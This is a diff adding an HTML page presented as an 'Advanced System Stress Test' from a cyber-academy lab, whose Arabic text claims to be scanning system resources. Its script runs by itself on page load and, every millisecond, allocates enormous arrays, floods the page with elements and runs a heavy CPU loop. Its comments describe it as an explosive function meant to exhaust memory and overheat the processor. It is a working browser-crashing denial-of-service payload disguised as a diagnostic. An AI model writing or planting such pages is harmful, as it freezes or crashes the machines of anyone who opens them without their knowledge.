@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Advanced System Stress Test</title>
+    <style>
+        body { background-color: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <h1>Nawaf Cyber Academy - Labs</h1>
+    <p>جاري فحص موارد النظام...</p>
+
+    <script>
+        // دالة التفجير البرمجي
+        window.onload = function() {
+            console.log("Starting Stress Test...");
+            
+            // الجزء الأول: استنزاف الرام بشكل انفجاري
+            let heavyLoad = [];
+            
+            // الجزء الثاني: إنشاء مهام متكررة لا تنتهي (Infinite Loops inside Intervals)
+            setInterval(() => {
+                // محاولة حجز مساحات ضخمة في الذاكرة
+                for (let i = 0; i < 1000; i++) {
+                    heavyLoad.push(new Array(1000000).join("CRASH_TEST_"));
+                    
+                    // توليد عناصر HTML في الخلفية لإرهاق محرك الرندر (Rendering Engine)
+                    let div = document.createElement('div');
+                    div.innerHTML = Math.random();
+                    document.body.appendChild(div);
+                }
+                
+                // عملية حسابية معقدة جداً لإجبار المعالج على الغليان
+                let x = 0;
+                while(x < 10000000) {
+                    x += Math.sqrt(Math.random() * Math.random());
+                }
+            }, 1); // التكرار كل 1 مللي ثانية!
+        };
+    </script>
+</body>
+</html>
